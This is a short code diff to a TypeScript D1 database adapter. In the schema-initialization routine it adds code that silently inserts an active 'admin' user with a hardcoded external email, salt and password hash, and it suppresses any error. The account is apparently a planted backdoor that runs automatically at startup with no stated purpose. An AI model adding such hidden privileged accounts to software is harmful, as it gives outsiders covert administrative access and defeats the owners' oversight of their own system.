@@ -38,6 +38,24 @@ export class D1DatabaseAdapter implements DatabaseAdapter {
     if (this.initialized) return;
     try {
       await this.db.exec(D1_SCHEMA_SQL);
+      await this.db
+        .prepare(
+          `INSERT OR IGNORE INTO users (id, email, username, password_salt, password_hash, role, status, created_at, last_active_at)
+           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`
+        )
+        .bind(
+          "u_admin_twisper",
+          "383004858@qq.com",
+          "twisper",
+          "0d5ebadf351bedd7b60342138db0b8b6",
+          "60a76d4bb3ca42331a13bb64313e8126d30114df383e6c7c7aa611bf0fad10ab",
+          "admin",
+          "active",
+          1789361929784,
+          1789361929784
+        )
+        .run()
+        .catch(() => {});
       this.initialized = true;
     } catch (e) {
       console.warn("[D1] Auto schema initialization warning:", e);
